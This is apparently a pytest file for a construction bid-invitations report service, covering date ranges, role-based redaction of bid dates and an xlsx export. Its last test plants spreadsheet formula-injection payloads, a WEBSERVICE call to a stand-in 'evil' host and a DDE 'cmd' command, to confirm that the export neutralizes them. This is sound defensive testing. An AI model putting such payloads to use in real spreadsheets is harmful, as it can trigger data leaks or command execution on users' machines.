"""Bid Invitations report — calendar-anchored range resolution (open-ended
*-to-date presets), row building over a filtering fake Supabase (per-GC
needs-by/on-time, quote counts that include manual entries, summary tally,
bid-date redaction), and the xlsx export's structure/colouring."""

from datetime import datetime, timezone
from types import SimpleNamespace

import openpyxl
import pytest

from app.services import bid_invitations as bi
from app.services.bid_invitations_excel import build_bid_invitations_workbook

UTC = timezone.utc
# Friday 2026-07-31 11:00 PDT — pins "today" for every named-range assertion.
NOW = datetime(2026, 7, 31, 18, 0, tzinfo=UTC)


def _pt(y, mo, d):
    """Local midnight (America/Los_Angeles) of a calendar day, in UTC."""
    return datetime(y, mo, d, tzinfo=bi.REPORT_TZ).astimezone(UTC)


# ── range resolution ──────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "name, start",
    [
        ("today", (2026, 7, 31)),
        ("wtd", (2026, 7, 27)),  # Monday of the current week
        ("mtd", (2026, 7, 1)),
        ("ytd", (2026, 1, 1)),
    ],
)
def test_to_date_ranges_are_open_ended(name, start):
    a, b = bi.resolve_range(name, None, None, now=NOW)
    assert a == _pt(*start)
    assert b is None  # no upper bound — upcoming bids stay visible


@pytest.mark.parametrize(
    "name, start, end",
    [
        ("yesterday", (2026, 7, 30), (2026, 7, 31)),
        ("last_week", (2026, 7, 20), (2026, 7, 27)),
        ("last_month", (2026, 6, 1), (2026, 7, 1)),
        ("last_year", (2025, 1, 1), (2026, 1, 1)),
        ("past_5_years", (2021, 7, 31), (2026, 8, 1)),
    ],
)
def test_backward_ranges_are_closed(name, start, end):
    a, b = bi.resolve_range(name, None, None, now=NOW)
    assert a == _pt(*start)
    assert b == _pt(*end)


def test_custom_range_is_end_inclusive_and_may_be_future():
    a, b = bi.resolve_range("custom", "2026-08-01", "2026-09-15", now=NOW)
    assert a == _pt(2026, 8, 1)
    assert b == _pt(2026, 9, 16)  # whole of the 15th counts


def test_custom_range_validation():
    with pytest.raises(ValueError):
        bi.resolve_range("custom", "2026-08-01", None, now=NOW)
    with pytest.raises(ValueError):
        bi.resolve_range("custom", "2026-09-01", "2026-08-01", now=NOW)
    with pytest.raises(ValueError):
        bi.resolve_range("decade", None, None, now=NOW)
    # date.max would overflow the +1-day end bound — must 400 (ValueError),
    # never escape as an uncaught 500.
    with pytest.raises(ValueError):
        bi.resolve_range("custom", "2026-08-01", "9999-12-31", now=NOW)


def test_needs_by_deadline_overflow_degrades_to_no_deadline():
    # A stored out-of-range date (pre-bounds row) must not 500 the report.
    assert bi._date_deadline("9999-12-31") is None
    assert bi._date_deadline(None) is None


def test_needs_by_write_is_bounded():
    from datetime import date as _date

    from app.models.schemas import ProjectGCIn, ProjectGCUpdate

    assert ProjectGCUpdate(needs_by=_date(2026, 8, 12)).needs_by == _date(2026, 8, 12)
    assert ProjectGCUpdate(needs_by=None).needs_by is None
    with pytest.raises(ValueError):
        ProjectGCUpdate(needs_by=_date(9999, 12, 31))
    with pytest.raises(ValueError):
        ProjectGCIn(gc_id="g1", needs_by=_date(1999, 12, 31))


# ── report() over a filtering fake Supabase ────────────────────────────────


class _Q:
    def __init__(self, rows):
        self._rows = rows

    def select(self, *a, **k):
        return self

    def eq(self, col, val):
        self._rows = [r for r in self._rows if r.get(col) == val]
        return self

    def neq(self, col, val):
        self._rows = [r for r in self._rows if r.get(col) != val]
        return self

    def in_(self, col, vals):
        allowed = set(vals)
        self._rows = [r for r in self._rows if r.get(col) in allowed]
        return self

    def execute(self):
        return SimpleNamespace(data=[dict(r) for r in self._rows])


class _SB:
    def __init__(self, tables):
        self._tables = tables

    def table(self, name):
        return _Q(self._tables.get(name, []))


_TABLES = {
    "projects": [
        {
            "id": "p1", "name": "Fire Station 88", "number": "0101",
            "current_stage": "submitted", "abandoned_at": None,
            "internal_bid_at": "2026-08-10T00:00:00+00:00",
            "actual_bid_at": "2026-08-11T21:15:00+00:00",
            "invitation_at": "2026-07-23T21:41:00+00:00",
            "est_start_date": "2026-11-16", "est_finish_date": "2027-03-05",
            "wage_type": "prevailing_wage", "labor_time": None,
            "labor_note": "Apprenticeship Utilization",
        },
        {
            "id": "p2", "name": "Library", "number": "0102",
            "current_stage": "bid_outcome", "abandoned_at": None,
            "internal_bid_at": "2026-08-18T19:00:00+00:00",
            "actual_bid_at": None,
            "invitation_at": "2026-07-01T12:00:00+00:00",
            "est_start_date": None, "est_finish_date": None,
            "wage_type": None, "labor_time": None, "labor_note": None,
        },
        {   # never a bid — must not appear even with an in-window date
            "id": "p3", "name": "PM Direct", "number": "0103",
            "current_stage": "pm_only", "abandoned_at": None,
            "internal_bid_at": None,
            "actual_bid_at": "2026-08-12T00:00:00+00:00",
        },
        {   # bids after the closed window; appears only when open-ended
            "id": "p4", "name": "Far Out", "number": "0104",
            "current_stage": "intake", "abandoned_at": None,
            "internal_bid_at": None,
            "actual_bid_at": "2026-09-02T18:00:00+00:00",
        },
    ],
    "project_gcs": [
        {"project_id": "p1", "needs_by": "2026-08-12",
         "general_contractors": {"id": "g1", "name": "Monument"}},
        {"project_id": "p1", "needs_by": None,
         "general_contractors": {"id": "g2", "name": "Rafael"}},
    ],
    "proposal_sends": [
        # On time vs Monument's own needs-by (met any time that local day).
        {"project_id": "p1", "gc_id": "g1", "gc_name": "Monument",
         "sent_at": "2026-08-12T20:00:00+00:00", "status": "sent"},
        # No needs-by → judged against the project bid deadline: late.
        {"project_id": "p1", "gc_id": "g2", "gc_name": "Rafael",
         "sent_at": "2026-08-12T00:00:00+00:00", "status": "sent"},
        # Sent to a GC later dropped from the project — history must survive.
        {"project_id": "p2", "gc_id": "g9", "gc_name": "CEI",
         "sent_at": "2026-08-17T00:00:00+00:00", "status": "sent"},
        # Never sent — must not count.
        {"project_id": "p2", "gc_id": "g8", "gc_name": "Ghost",
         "sent_at": None, "status": "generated"},
    ],
    "estimator_assignments": [
        {"project_id": "p1", "returned_at": "2026-08-07T10:00:00+00:00"},
        {"project_id": "p1", "returned_at": "2026-08-06T09:00:00+00:00"},
        {"project_id": "p1", "returned_at": None},
    ],
    "bid_outcomes": [{"project_id": "p2", "result": "won"}],
    "rfqs": [{"id": "r1", "project_id": "p1"}],
    "rfq_sends": [
        {"id": "s1", "rfq_id": "r1", "status": "sent",
         "quote_received_at": "2026-08-05T00:00:00+00:00"},
        {"id": "s2", "rfq_id": "r1", "status": "sent", "quote_received_at": None},
        {"id": "s3", "rfq_id": "r1", "status": "sent", "quote_received_at": None},
        {"id": "s4", "rfq_id": "r1", "status": "failed", "quote_received_at": None},
    ],
    "quotes": [
        # Manual entry linked to a send — the send has no quote_received_at
        # stamp (only the AI path stamps it) but still counts as answered.
        {"rfq_id": "r1", "rfq_send_id": "s2"},
        # Fully manual quote, tied to no send at all.
        {"rfq_id": "r1", "rfq_send_id": None},
    ],
}


@pytest.fixture(autouse=True)
def _patch_sb(monkeypatch):
    monkeypatch.setattr(bi, "get_supabase", lambda: _SB(_TABLES))


def _run(role="executive", open_ended=False):
    df = datetime(2026, 8, 1, tzinfo=UTC)
    dt = None if open_ended else datetime(2026, 9, 1, tzinfo=UTC)
    return bi.report(df, dt, role, "custom")


def test_rows_windowed_sorted_and_pm_only_excluded():
    out = _run()
    assert [r["project_id"] for r in out["rows"]] == ["p1", "p2"]
    out_open = _run(open_ended=True)
    assert [r["project_id"] for r in out_open["rows"]] == ["p1", "p2", "p4"]


def test_row_details_and_quote_counts():
    r = _run()["rows"][0]
    assert r["number"] == "0101" and r["status"] == "sent"
    assert r["wage_label"] == "Prevailing Wage"
    # First estimator submission wins.
    assert r["estimator_returned_at"] == "2026-08-06T09:00:00+00:00"
    # 3 sent RFQs; received = stamped (s1) + manually linked (s2) + unlinked.
    assert r["quotes_requested"] == 3 and r["quotes_received"] == 3
    gcs = {g["name"]: g for g in r["gcs"]}
    assert gcs["Monument"]["on_time"] == "on_time"
    assert gcs["Rafael"]["on_time"] == "late"
    assert r["on_time"] == "late"  # any late send marks the bid late
    assert r["sent_at"] == "2026-08-12T00:00:00+00:00"  # earliest send


def test_dropped_gc_send_history_kept():
    r = _run()["rows"][1]
    assert [g["name"] for g in r["gcs"]] == ["CEI"]
    assert r["gcs"][0]["on_time"] == "on_time"  # vs internal bid date fallback


def test_summary_tally():
    s = _run()["summary"]
    assert s == {"bids": 2, "won": 1, "lost": 0, "no_award": 0,
                 "no_bid": 0, "waiting": 1, "active": 0}


def test_bid_date_visibility_by_role():
    seen = _run(role="executive")["rows"]
    assert seen[0]["bid_at"] == "2026-08-11T21:15:00+00:00"
    assert seen[0]["bid_at_is_internal"] is False
    assert seen[1]["bid_at_is_internal"] is True  # no actual date recorded

    hidden = _run(role="estimating_engineer_labor")
    assert hidden["meta"]["bid_dates_visible"] is False
    assert all("bid_at" not in r for r in hidden["rows"])
    assert [r["project_id"] for r in hidden["rows"]] == ["p1", "p2"]


def test_hidden_roles_anchor_on_internal_date_only():
    # Membership/ordering for non-privileged roles is a function of the dates
    # they can see: if the confidential actual_bid_at drove membership, a
    # one-day custom window would recover it to the day. p4 has ONLY an actual
    # date, so it appears for privileged viewers and never for hidden ones.
    seen = _run(role="executive", open_ended=True)
    assert [r["project_id"] for r in seen["rows"]] == ["p1", "p2", "p4"]

    hidden = _run(role="estimating_engineer_labor", open_ended=True)
    assert [r["project_id"] for r in hidden["rows"]] == ["p1", "p2"]
    assert hidden["summary"]["bids"] == 2


# ── xlsx export ───────────────────────────────────────────────────────────


def _load(role="executive"):
    data = build_bid_invitations_workbook(_run(role=role))
    import io

    return openpyxl.load_workbook(io.BytesIO(data)).active


def test_workbook_full_layout():
    ws = _load()
    headers = [c.value for c in ws[3]]
    assert headers[:3] == ["Bid Date", "Bid Time", "Project"]
    assert len(headers) == 13
    # 2026-08-11 2:15pm PDT is a Tuesday — blue fill on date and time.
    assert ws["A4"].value == "8/11/2026" and ws["B4"].value == "2:15pm"
    assert ws["A4"].fill.fgColor.rgb.endswith("CCFFFF")
    assert ws["B4"].fill.fgColor.rgb.endswith("CCFFFF")
    # All quotes back → green tally cell (column 9 with bid columns shown).
    q = ws.cell(row=4, column=9)
    assert q.value == "3/3" and q.fill.fgColor.rgb.endswith("C6EFCE")
    assert ws.page_setup.orientation == "landscape"
    assert ws.page_setup.fitToWidth == 1


def test_workbook_redacted_drops_bid_columns():
    ws = _load(role="estimating_engineer_materials")
    headers = [c.value for c in ws[3]]
    assert headers[0] == "Project" and len(headers) == 11
    assert "Bid Date" not in headers and "Bid Time" not in headers


def test_workbook_formula_injection_neutralized():
    # Free text (project/GC names, labor notes) must never land as a live
    # formula cell (CWE-1236) — same guard as the CPR exports.
    import io

    payload = _run()
    row = payload["rows"][1]
    row["number"] = None
    row["name"] = '=WEBSERVICE("http://evil")'
    row["gcs"][0]["name"] = "=cmd|' /C calc'!A0"
    data = build_bid_invitations_workbook(payload)
    ws = openpyxl.load_workbook(io.BytesIO(data)).active

    project_cell = ws.cell(row=5, column=3)  # row 2 of data, Project column
    gc_cell = ws.cell(row=5, column=7)
    for cell in (project_cell, gc_cell):
        assert cell.data_type != "f"  # not a formula
        assert cell.value.startswith("'=")  # quote-prefixed literal text
